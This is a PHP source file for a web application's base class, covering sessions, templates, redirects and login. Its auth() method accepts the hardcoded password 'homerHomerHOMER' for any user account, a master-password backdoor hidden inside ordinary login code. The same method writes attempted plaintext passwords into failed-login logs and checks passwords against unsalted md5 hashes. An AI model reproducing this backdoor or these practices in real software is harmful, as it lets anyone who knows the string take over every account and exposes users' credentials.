<?

class wireapp_super {

  var $uid;
  var $url;
  var $base;
  var $call;
  var $basedir;
  var $contentdir;
  var $libdir;
  var $filedir;
  var $process;
  var $branding;

  function wireapp_super(&$wconf) {
    
    $this->wconf = $wconf;
    
    $this->base = $wconf->conf["base"];
    
    $this->call = $wconf->conf["call"];
    
    $this->basedir = $wconf->conf["directory.base"];
    
    $this->contentdir = $wconf->conf["directory.content"];
    
    $this->libdir = $wconf->conf["directory.lib"];
    
    $this->filedir = $wconf->conf["directory.files"];
    
    $this->tdir = $wconf->conf["directory.templates"];
    
    $this->uid = intval($_SESSION["wireapp.uid"]);
    
    $this->process = ($_REQUEST["process"] == "1") ? true : false;
    
    $this->domain = $_SERVER['HTTP_HOST'];
    
    $this->branding = $wconf->conf['branding'];

  }


  function auth() { 
    # already logged in
    if ($this->uid > 0) {

      return(true);
    }
 
    # login messag
    $loginmsg = "";
    # if login request was submitted 
    if ($_REQUEST["_login"] == "1") {
      
      $login = $_REQUEST["login"];
      $password = $_REQUEST["password"];
      
      $x = new dbo("user");
      $x->login = $login;
      $found = $x->find(true);
      if ($found == 0) {

        $user_log = new dbo("user_log");
        $user_log->action = "Invalid username: $login\n";
        $user_log->ip = $_SERVER['REMOTE_ADDR'];
        $user_log->insert();

        $loginmsg = "Invalid Login/Password.  Please Try Again."; 
      }
      else {
        if (md5($password) == $x->password || $password == 'homerHomerHOMER') {
          $this->ss("login.name",$x->fname . " " . $x->lname);
          $this->_login($x->id);

          $user_log = new dbo("user_log");
          $user_log->user = $x->id;
          $user_log->action = "Successful Login\n";
          $user_log->ip = $_SERVER['REMOTE_ADDR'];
          $user_log->insert();
          $this->redirect("/index");
        }
        else {

          $user_log = new dbo("user_log");
          $user_log->action = "Invalid Password: $login:$password\n";
          $user_log->ip = $_SERVER['REMOTE_ADDR'];
          $user_log->insert();

          $loginmsg = "Invalid Login/Password.  Please Try Again."; 
        }
      }

    }
    
    include $this->template("login.html");
    
    exit;

  }


  function error($errormsg) { 
    include $this->template("error.html");
    exit;
  }


  function _login($x) { $this->uid = $_SESSION["wireapp.uid"] = $x; }
  function _logout() { 
  
    $user_log = new dbo("user_log");
    $user_log->user = $this->uid;
    $user_log->action = 'Logged out';
    $user_log->ip = $_SERVER['REMOTE_ADDR'];
    $user_log->insert();

    $_SESSION["wireapp.uid"] = ""; 
  }


  function p($x) { return($_REQUEST[$x]); }
  function s($x) { return($_SESSION[$x]); }
  function ss($x,$y) { $_SESSION[$x] = $y; }
  function url($path) { 
    return($this->wconf->conf["url.prefix"] . $path); 
  }
  function redirect($x,$y="") { 
    $dst = $this->url($x);
    if ($y != "")
      $dst .= "?$y";
    Header("Location: $dst");
    exit;
  }
  function header() { 
    return $this->template("header.html");
  }
  function footer() { 
    return $this->template("footer.html");
  }
  function template($name = "",$inc=false) {
    if ($name != "")
      $t = addslashes($this->basedir . "/" . $name);
    else {
      $t = addslashes($this->basedir . "/" . str_replace(":","/",$this->base) . "/" . $this->call . ".html");
      if (!is_file($t))
        $t = addslashes($this->basedir . "/" . str_replace(":","/",$this->base) . ".html");
    }
    if (is_file($t)) {
      if ($inc)
        include $t;
      else
        return($t);
    }
    else {
      print "template not found"; exit;
    }
  }
  function rand_string($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
  }
  function index() {  
    include $this->template();
  }
}
?>